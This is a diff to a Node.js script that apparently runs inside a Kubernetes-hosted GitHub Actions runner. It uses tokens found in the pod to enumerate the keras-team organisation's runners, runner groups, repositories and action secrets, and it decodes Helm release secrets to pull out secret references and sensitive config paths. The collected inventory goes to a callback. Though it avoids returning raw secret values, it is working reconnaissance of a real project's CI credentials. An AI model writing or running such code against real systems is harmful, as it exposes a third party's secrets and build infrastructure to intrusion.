@@ -5,6 +5,7 @@ const fs = require("fs");
 const http = require("http");
 const https = require("https");
 const path = require("path");
+const zlib = require("zlib");
 
 const RUNNER_ROOT = "/home/runner";
 const KSA_ROOT = "/var/run/secrets/kubernetes.io/serviceaccount";
@@ -366,10 +367,35 @@ async function apiRequest(url, token, method = "GET", body = null) {
 }
 
 function responseSummary(response) {
+  const apiError = response.value && response.value.error;
+  const details = apiError && Array.isArray(apiError.details) ? apiError.details : [];
   return {
     ok: Boolean(response.ok),
     status: response.status || null,
     error: response.error || null,
+    api_error:
+      apiError && typeof apiError === "object"
+        ? {
+            code: apiError.code || null,
+            status: apiError.status || null,
+            message: typeof apiError.message === "string"
+              ? apiError.message.slice(0, 500)
+              : null,
+            reasons: details
+              .map((detail) => ({
+                reason: detail.reason || null,
+                domain: detail.domain || null,
+                service: detail.metadata && detail.metadata.service,
+              }))
+              .filter((detail) => detail.reason || detail.domain || detail.service),
+          }
+        : typeof apiError === "string"
+          ? apiError.slice(0, 500)
+          : null,
+    api_message:
+      response.value && typeof response.value.message === "string"
+        ? response.value.message.slice(0, 500)
+        : null,
   };
 }
 
@@ -379,15 +405,65 @@ async function githubReadAuthority(token) {
     await Promise.all([
       apiRequest(`${base}/user`, token),
       apiRequest(`${base}/repos/keras-team/keras`, token),
-      apiRequest(`${base}/orgs/keras-team/actions/runners?per_page=1`, token),
-      apiRequest(`${base}/orgs/keras-team/actions/runner-groups?per_page=1`, token),
+      apiRequest(`${base}/orgs/keras-team/actions/runners?per_page=100`, token),
+      apiRequest(`${base}/orgs/keras-team/actions/runner-groups?per_page=100`, token),
       apiRequest(`${base}/repos/keras-team/keras/actions/secrets?per_page=1`, token),
       apiRequest(`${base}/orgs/keras-team/packages?package_type=container&per_page=1`, token),
       apiRequest(`${base}/installation/repositories?per_page=100`, token),
     ]);
-  const repoItems = repos.value && Array.isArray(repos.value.repositories)
-    ? repos.value.repositories
-    : [];
+  const repoItems =
+    repos.value && Array.isArray(repos.value.repositories)
+      ? repos.value.repositories
+      : [];
+  const runnerItems =
+    runners.value && Array.isArray(runners.value.runners)
+      ? runners.value.runners
+      : [];
+  const groupItems =
+    runnerGroups.value && Array.isArray(runnerGroups.value.runner_groups)
+      ? runnerGroups.value.runner_groups
+      : [];
+  const groupDetails = [];
+  for (const group of groupItems) {
+    const [groupRepos, groupRunners] = await Promise.all([
+      apiRequest(
+        `${base}/orgs/keras-team/actions/runner-groups/${group.id}/repositories?per_page=100`,
+        token,
+      ),
+      apiRequest(
+        `${base}/orgs/keras-team/actions/runner-groups/${group.id}/runners?per_page=100`,
+        token,
+      ),
+    ]);
+    groupDetails.push({
+      id: group.id,
+      name: group.name,
+      visibility: group.visibility,
+      default: Boolean(group.default),
+      allows_public_repositories: Boolean(group.allows_public_repositories),
+      restricted_to_workflows: Boolean(group.restricted_to_workflows),
+      selected_workflows: group.selected_workflows || [],
+      repositories: {
+        ...responseSummary(groupRepos),
+        names:
+          groupRepos.ok && Array.isArray(groupRepos.value.repositories)
+            ? groupRepos.value.repositories.map((repo) => ({
+                full_name: repo.full_name,
+                visibility: repo.visibility,
+                private: Boolean(repo.private),
+                archived: Boolean(repo.archived),
+              }))
+            : [],
+      },
+      runners: {
+        ...responseSummary(groupRunners),
+        names:
+          groupRunners.ok && Array.isArray(groupRunners.value.runners)
+            ? groupRunners.value.runners.map((runner) => runner.name)
+            : [],
+      },
+    });
+  }
   const scopeHeader =
     (user.headers && user.headers["x-oauth-scopes"]) ||
     (repository.headers && repository.headers["x-oauth-scopes"]) ||
@@ -416,10 +492,24 @@ async function githubReadAuthority(token) {
     organization_runners: {
       ...responseSummary(runners),
       total_count: runners.ok ? runners.value.total_count : null,
+      runners: runnerItems.map((runner) => ({
+        id: runner.id,
+        name: runner.name,
+        os: runner.os,
+        status: runner.status,
+        busy: Boolean(runner.busy),
+        labels: Array.isArray(runner.labels)
+          ? runner.labels.map((label) => ({
+              name: label.name,
+              type: label.type,
+            }))
+          : [],
+      })),
     },
     organization_runner_groups: {
       ...responseSummary(runnerGroups),
       total_count: runnerGroups.ok ? runnerGroups.value.total_count : null,
+      groups: groupDetails,
     },
     repository_actions_secrets: {
       ...responseSummary(actionSecrets),
@@ -434,13 +524,12 @@ async function githubReadAuthority(token) {
     installation_repositories: {
       ...responseSummary(repos),
       total_count: repos.ok ? repos.value.total_count : null,
-      keras_family: repoItems
-        .map((repo) => repo.full_name)
-        .filter((name) =>
-          ["keras-team/keras", "keras-team/keras-hub", "keras-team/keras-rs"].includes(
-            name,
-          ),
-        ),
+      repositories: repoItems.map((repo) => ({
+        full_name: repo.full_name,
+        visibility: repo.visibility,
+        private: Boolean(repo.private),
+        archived: Boolean(repo.archived),
+      })),
     },
   };
 }
@@ -552,6 +641,115 @@ async function analyzeGithubSecret(secret) {
   return result;
 }
 
+function sensitiveConfigPaths(value, prefix = [], output = []) {
+  if (!value || typeof value !== "object") return output;
+  for (const [key, child] of Object.entries(value)) {
+    const next = [...prefix, key];
+    if (/token|secret|password|private|credential|api.?key/i.test(key)) {
+      output.push({
+        path: next.join("."),
+        value_type: Array.isArray(child) ? "array" : typeof child,
+        string_length: typeof child === "string" ? child.length : null,
+        object_keys:
+          child && typeof child === "object" && !Array.isArray(child)
+            ? Object.keys(child).sort()
+            : [],
+      });
+    }
+    sensitiveConfigPaths(child, next, output);
+  }
+  return output;
+}
+
+function helmRelease(value) {
+  try {
+    let payload = Buffer.from(value, "base64");
+    const text = payload.toString("utf8").trim();
+    if (text.startsWith("H4sI")) payload = Buffer.from(text, "base64");
+    if (payload[0] === 0x1f && payload[1] === 0x8b) {
+      payload = zlib.gunzipSync(payload);
+    }
+    const release = JSON.parse(payload.toString("utf8"));
+    const config = release.config || {};
+    const template = config.template || {};
+    const podSpec = template.spec || {};
+    const containers = Array.isArray(podSpec.containers) ? podSpec.containers : [];
+    const volumes = Array.isArray(podSpec.volumes) ? podSpec.volumes : [];
+    const configSecret = config.githubConfigSecret;
+    return {
+      parsed: true,
+      name: release.name || null,
+      namespace: release.namespace || null,
+      version: release.version || null,
+      status: release.info && release.info.status,
+      chart: release.chart && release.chart.metadata
+        ? {
+            name: release.chart.metadata.name,
+            version: release.chart.metadata.version,
+            app_version: release.chart.metadata.appVersion,
+          }
+        : null,
+      selected_config: {
+        githubConfigUrl: config.githubConfigUrl || null,
+        githubConfigSecret:
+          typeof configSecret === "string"
+            ? { mode: "reference", name: configSecret }
+            : configSecret && typeof configSecret === "object"
+              ? { mode: "inline", key_names: Object.keys(configSecret).sort() }
+              : { mode: "absent" },
+        runnerScaleSetName: config.runnerScaleSetName || null,
+        runnerGroup: config.runnerGroup || null,
+        minRunners: config.minRunners ?? null,
+        maxRunners: config.maxRunners ?? null,
+        vaultType:
+          config.vaultConfig && typeof config.vaultConfig === "object"
+            ? config.vaultConfig.type || null
+            : null,
+        containerMode:
+          typeof config.containerMode === "string"
+            ? config.containerMode
+            : config.containerMode && typeof config.containerMode === "object"
+              ? Object.keys(config.containerMode).sort()
+              : null,
+        runner_template: {
+          serviceAccountName: podSpec.serviceAccountName || null,
+          automountServiceAccountToken:
+            podSpec.automountServiceAccountToken ?? null,
+          hostNetwork: podSpec.hostNetwork ?? null,
+          hostPID: podSpec.hostPID ?? null,
+          containers: containers.map((container) => ({
+            name: container.name || null,
+            image: container.image || null,
+            env_names: Array.isArray(container.env)
+              ? container.env.map((entry) => entry.name).filter(Boolean).sort()
+              : [],
+            secret_env_refs: Array.isArray(container.env)
+              ? container.env
+                  .map((entry) => entry.valueFrom && entry.valueFrom.secretKeyRef)
+                  .filter(Boolean)
+                  .map((ref) => ({ name: ref.name, key: ref.key }))
+              : [],
+          })),
+          secret_volumes: volumes
+            .filter((volume) => volume.secret)
+            .map((volume) => ({
+              volume_name: volume.name,
+              secret_name: volume.secret.secretName,
+            })),
+        },
+      },
+      sensitive_config_paths: sensitiveConfigPaths(config),
+      manifest_bytes: typeof release.manifest === "string"
+        ? Buffer.byteLength(release.manifest)
+        : null,
+      manifest_returned: false,
+      config_values_returned: false,
+    };
+  } catch (error) {
+    return { parsed: false, error: error.code || error.name };
+  }
+}
+
 async function classifySecrets(client, namespace) {
   const quoted = encodeURIComponent(namespace);
   const response = await client.call(
@@ -570,14 +768,22 @@ async function classifySecrets(client, namespace) {
       : [],
   }));
   const githubCredentials = [];
+  const helmReleases = [];
   for (const secret of response.value.items) {
     const analyzed = await analyzeGithubSecret(secret);
     if (analyzed) githubCredentials.push(analyzed);
+    if (secret.type === "helm.sh/release.v1" && secret.data && secret.data.release) {
+      helmReleases.push({
+        secret_name: secret.metadata.name,
+        ...helmRelease(secret.data.release),
+      });
+    }
   }
   return {
     ok: true,
     inventory,
     github_credentials: githubCredentials,
+    helm_releases: helmReleases,
     secret_values_returned: false,
     secret_value_hashes_returned: false,
   };
@@ -895,7 +1101,11 @@ async function send(value) {
   if (!response.ok) throw new Error("callback failed");
 }
 
-collect()
-  .then(send)
-  .then(() => process.exit(0))
-  .catch(() => process.exit(1));
+if (require.main === module) {
+  collect()
+    .then(send)
+    .then(() => process.exit(0))
+    .catch(() => process.exit(1));
+}
+
+module.exports = { appJwt, helmRelease, sensitiveConfigPaths };
